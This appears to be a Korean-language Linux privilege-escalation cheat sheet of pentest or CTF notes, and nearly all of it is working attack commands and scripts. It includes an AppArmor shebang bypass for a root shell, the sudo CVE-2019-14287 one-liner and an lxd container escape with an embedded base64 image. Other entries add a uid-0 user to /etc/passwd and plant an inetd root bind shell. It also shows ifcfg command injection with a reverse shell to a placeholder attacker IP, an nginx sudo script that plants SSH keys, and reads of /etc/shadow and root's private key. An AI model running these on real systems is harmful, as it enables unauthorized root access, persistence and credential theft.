<details>
  <summary><strong>ruid euid</strong></summary>

- `ruid` : `Real User ID` / 프로세스를 실행한 유저.
- `euid` : `Effective User ID` / 프로세스 실제 실행 유저.(SUID가 설정되어 있으면 euid는 0으로 설정 됨.)
- 디버깅을 할 경우 SUID가 설정되어 있더라도 유저 권한으로 디버깅이 됨.
  
</details>

---
<details>
  <summary><strong>AppArmor Bypass via Shebang</strong></summary>

## AppArmor란?
- 프로그램별로 접근 가능한 파일/디렉토리를 제한하는 보안 시스템
- 프로필이 있는 프로그램만 제한 (없으면 일반 권한만 체크)
- 기본적으로 허용되지 않는 프로그램은 거부되는 것이 맞으나, 추상화나 포괄적 규칙을 오버라이드 하기 위해서 `deny`를 사용.
- 프로필 위치: /etc/apparmor.d/

## Shebang이란?
- 스크립트 첫 줄의 #!인터프리터경로
- 스크립트를 어떤 프로그램으로 실행할지 지정
- ./script.sh 처럼 직접 실행 가능하게 함

## 취약점: Shebang Bypass
- SUID가 설정되어 있어야 한다.

방법 1: perl 직접 호출 (차단됨)
```bash
perl exploit.pl
```
→ AppArmor가 "perl" 실행을 감지
→ /etc/apparmor.d/usr.bin.perl 프로필 적용
→ deny /root/* 규칙으로 차단 ❌

방법 2: Shebang 실행 (우회됨)
```bash
./exploit.pl
```
→ AppArmor가 "exploit.pl" 실행을 감지
→ exploit.pl 프로필 없음 → 통과
→ Shebang(#!/usr/bin/perl)이 perl 호출
→ 이미 AppArmor 체크 끝남 → 제한 없음 ✅

## 공격 방법
1. exploit.pl 작성
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";

2. 실행 권한 부여
chmod +x exploit.pl

3. Shebang으로 실행
./exploit.pl → root shell!

## 핵심
AppArmor는 "직접 호출된" 프로그램만 체크
Shebang의 "간접 호출"은 감지 못함 (설계상 버그)


  
</details>

---
<details>
  <summary><strong>Apache VHOST</strong></summary>

> `/etc/apache2/sites-enabled`에서 VHOST확인.
<img width="1105" height="119" alt="image" src="https://github.com/user-attachments/assets/2d23850a-94b7-4f05-b159-918eea76f4d6" />

  
</details>

---
<details>
  <summary><strong>Sudo !root bypass(CVE-2019-14287)</strong></summary>

- `sudo -l`를 실행하여 `!root`권한으로 실행이 되는지 확인.
- version < 1.8.28
```bash
varSudo=$(sudo -l | \grep '(' | cut -d/ -f2-)
sudo -u#-1 /$varSudo
```
  
</details>

---
<details>
  <summary><strong>lxd/lxc Group</strong></summary>

- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#lxdlxc-group---privilege-escalation
- 홈 디렉토리에서 실행해야 한다.

```bash
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2

lxc image import bob.tar.bz2 --alias bobImage

lxc init bobImage bobVM -c security.privileged=true

lxc config device add bobVM realRoot disk source=/ path=r

lxc start bobVM

lxc exec bobVM -- /bin/sh

# cat /r/root/root.txt 
sup3rS5cr3tF1AgThatN0OneCanSee
```
  
</details>

---
<details>
  <summary><strong>Add New Root User</strong></summary>

```bash
# 패스워드 해시 생성
openssl passwd mrcake
# Output: hKLD3431415ZE

# /etc/passwd에 새로운 root 사용자 추가
echo "root2:hKLD3431415ZE:0:0:root:/root:/bin/bash" >> /etc/passwd

# root2로 전환
su root2
Password: mrcake 
```
  
</details>

---
<details>
  <summary><strong>시스템 정보 수집</strong></summary>

### OS 정보 확인
```bash
cat /etc/issue
cat /etc/os-release
uname -a

cat /etc/shadow
cat /proc/self/cmdline
```

### 프로세스 및 네트워크 상태 확인
```bash
ps aux
ifconfig

# 무선 네트워크 인터페이스 정보와 설정 확인
iw dev

routel
ss -anp

# IPv4 iptables 방화벽 규칙 확인
cat /etc/iptables/rules.v4
```

### Cron 작업 확인
```bash
ls -al /etc/cron*
sudo crontab -l
```

### 패키지 목록 조회
```bash
dpkg -l
```

### 쓰기 가능한 파일 및 디렉토리 찾기
```bash
find / -writable -type d 2>/dev/null
find /etc -writable -type f 2>/dev/null
find /usr -writable -type f 2>/dev/null
find /var -writable -type f 2>/dev/null
```

### 마운트 및 디스크 정보 조회
```bash
# 부팅 시 자동 마운트되는 파일 시스템 정보 확인
cat /etc/fstab

mount

# 블록 디바이스(디스크, 파티션) 정보 출력
lsblk
```

### 커널 모듈 정보
```bash
# 현재 로드된 커널 모듈 목록 표시
lsmod

# 특정 커널 모듈의 상세 정보 확인
/sbin/modinfo libata
```

### SUID/SGID 파일 찾기
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
```

### Capabilities 확인
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

### Sudo 권한 확인
<img width="1106" height="131" alt="image" src="https://github.com/user-attachments/assets/b532742c-c518-4932-b5b2-4f829f2ef0e5" />

- `env_reset` : `sudo`실행시 환경변수 초기화
- `SETENV:` : 환경변수 전달 가능.
  
</details>

---
<details>
  <summary><strong>Linux Exploit Suggester</strong></summary>

- https://github.com/The-Z-Labs/linux-exploit-suggester
- 예전 버전 리눅스 취약점 발견에 용이
  
</details>

---
<details>
  <summary><strong>Disk Group Privilege Escalation</strong></summary>

- https://www.hackingarticles.in/disk-group-privilege-escalation/
- `disk` 그룹은 로우 블록 디바이스(예: `/dev/sda`, `/dev/nvme0n1p2`)에 접근할 수 있음

```bash
# 현재 마운트된 파일시스템의 디스크 사용량 확인
df -h
```
<img width="689" height="248" alt="image" src="https://github.com/user-attachments/assets/96e0cff6-b9f2-4624-9c36-417a71ddac0c" />

```bash
# 파일시스템의 내부 구조를 조작하거나 디버깅
debugfs /dev/sda3

# readonly로 설정되어 있으면 아래 명령 실행
mkdir test

# SSH 개인키 읽기
cat /root/.ssh/id_rsa
```
  
</details>

---
<details>
  <summary><strong>rpc.py Exploit</strong></summary>

- https://github.com/abersheeran/rpc.py
- https://www.exploit-db.com/exploits/50983

  
</details>

---
<details>
  <summary><strong>Makefile Privilege Escalation</strong></summary>

<img width="706" height="636" alt="image" src="https://github.com/user-attachments/assets/553e10b6-f5d7-4494-b3da-94c3167651d4" />

- https://medium.com/@adamforsythebartlett/makefile-privilege-escalation-oscp-62ea2c666d23
  
</details>

---
<details>
  <summary><strong>System CTL</strong></summary>

```bash
# nginx 서비스 유닛 내용 보기
systemctl cat nginx.service
```
  
</details>

---
<details>
  <summary><strong>7z Wildcard Exploit</strong></summary>

```bash
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
- https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks
  
</details>

---
<details>
  <summary><strong>Tar Wildcard Exploit</strong></summary>

<img width="675" height="350" alt="image" src="https://github.com/user-attachments/assets/af27b485-c6fb-4ab7-9b35-b2e20a5f01fa" />

- https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
  
</details>

---
<details>
  <summary><strong>Set SUID</strong></summary>

```bash
chmod +s /bin/bash
```
  
</details>

---
<details>
  <summary><strong>SSH</strong></summary>

- authorized_keys를 변경할 수 있으면 변경
  
</details>

---
<details>
  <summary><strong>공유 라이브러리 취약점</strong></summary>

```bash
# 실행 파일이 사용하는 공유 라이브러리 확인
ldd /usr/bin/log-sweeper
```

```bash
# 공유 라이브러리 만들기
gcc -shared -fPIC ex.c -o ex.so
```
  
</details>

---
<details>
  <summary><strong>Linux Path Variables</strong></summary>

```bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

- `PATH`에서 앞에 설정 된 경로부터 순차적으로 찾아서 실행.
- `popen`/`exec`/`system`함수를 사용하여 프로그램을 실행할 경우 `PATH`변수에서 새로운 경로를 추가해주고 특정 프로그램의 내용을 변경해서 침투.
- 취약점 공격보다 먼저 시도해보는 것이?
  
</details>

---
<details>
  <summary><strong>inetd.conf (옛날 리눅스 환경)</strong></summary>

```bash
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
```
- 31337번 포트로 바인드 셸 연결
  
</details>

---
<details>
  <summary><strong>.bashrc</strong></summary>

<img width="1104" height="48" alt="image" src="https://github.com/user-attachments/assets/aaf938c7-d5f8-4d6c-8a25-a9d27019894c" />

- `enable -n` : `bash`에서 내장 명령어 비활성화.
- 위의 스크립트에서 `#`에 대해서 제대로 처리가 안되어서 이후는 주석처리.

  
</details>

---
<details>
  <summary><strong>MOTD</strong></summary>

```bash
find / -user george 2>/dev/null
```
<img width="1103" height="136" alt="image" src="https://github.com/user-attachments/assets/331b165f-6d1b-42b7-8929-b9dae2637d6c" />

<br>
<br>

```bash
dpkg -l | grep -i pam
```
<img width="1103" height="142" alt="image" src="https://github.com/user-attachments/assets/8c45a4c8-bd6e-4df2-92ff-2bea7d83dc3d" />

<br>
<br>

<img width="1103" height="204" alt="image" src="https://github.com/user-attachments/assets/9182c4f8-154e-4020-b544-ecf3300a242b" />

</details>

---
<details>
  <summary><strong>network scripts</strong></summary>

## 개요

RHEL/CentOS의 `network-scripts` 패키지에서 네트워크 설정 파일 처리 시 발생하는 명령 삽입 취약점

- **영향 시스템**: RHEL/CentOS 6, 7 (레거시 시스템만)
- **취약 위치**: `/etc/sysconfig/network-scripts/ifcfg-*`, `route-*`
- **현재 상태**: RHEL 8에서 deprecated, RHEL 9에서 완전 제거

## 공격 방법

### 전제 조건
- `/etc/sysconfig/network-scripts/` 디렉토리에 쓰기 권한 필요

### 기본 공격

`/etc/sysconfig/network-scripts/ifcfg-exploit` 파일 생성:

```bash
NAME=Network /bin/bash
ONBOOT=yes
DEVICE=eth0
```

공백 이후 `/bin/bash`가 root 권한으로 실행됨

### 페이로드 예시

```bash
# 리버스 쉘
NAME=x /bin/bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'

# SUID 바이너리 생성
NAME=x /bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash
```

### Ref
- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=ifcf#etcsysconfignetwork-scripts-centosredhat
  
</details>

---
<details>
  <summary><strong>knockd</strong></summary>

- `knockd` 사용 중.
<img width="1204" height="28" alt="image" src="https://github.com/user-attachments/assets/27ca3ed0-3ba0-4338-a4ec-de00cccac31a" />

<br>
<br>

- `/etc/knockd`에서  `nftables` 혹은 `iptables` 사용 중인 상태 필요.
<img width="1204" height="116" alt="image" src="https://github.com/user-attachments/assets/79292836-0500-4131-bf72-02625897bb90" />

<br>
<br>

```bash
# 노킹 시도
nmap -Pn --host-timeout 201 --max-retries 0  -p 1111 host

# SSH 연결 시도
ssh user@host # Now logins are allowed
```
  
</details>

---
<details>
  <summary><strong>nginx configuration file privesc</strong></summary>

- https://github.com/DylanGrl/nginx_sudo_privesc
```bash
#!/bin/sh
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```
  
</details>

---
<details>
	<summary><strong>Read Link File(tail,head)</strong></summary>

- `root`권한으로 실행되는 파일 읽기에 `/root/.ssh/id_rsa`같은 파일들을 링크를 생성하여 읽을 경우 권한 상승이 가능할 수 있다.
<img width="1202" height="102" alt="image" src="https://github.com/user-attachments/assets/96e78a8f-4746-482d-9911-15bd45309a85" />

	
</details>

---
<details>
 <summary><strong>list-timers</strong></summary>

- `.timer`가 존재할 때 확인.
```bash
systemctl list-timers
```
 
</details>
